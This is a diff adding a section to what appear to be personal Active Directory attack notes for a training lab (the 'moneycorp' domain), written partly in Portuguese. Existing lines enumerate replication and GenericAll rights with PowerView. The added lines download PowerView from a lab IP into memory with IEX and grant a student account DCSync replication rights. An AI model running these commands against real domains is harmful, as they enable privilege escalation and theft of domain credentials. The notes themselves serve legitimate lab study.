@@ -2650,6 +2650,14 @@ Get-ObjectAcl -Distinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 Get-ObjectAcl -Distinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication') -or ($_ActiveDirectoryRights -match 'GenericAll')} | select ObjectType,IdentityReference, ActiveDirectoryRights
 Get-ObjectAcl -Distinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.Identityreference -match "administrator") -and (($_.ObjectType -match 'replication') -or ($_ActiveDirectoryRights -match 'GenericAll'))} | select ObjectType,IdentityReference, ActiveDirectoryRights
 ```
+##### POWERVIEW OLD - ADICIONAR PERMISSÃO PARA REPLICAR O AD DCSYNC
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/PowerView.ps1")
+Add-ObjectAcl -TargetDistinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountname student209 -Rights Dcsync -Verbose
+```
+
+
+
 
 
 
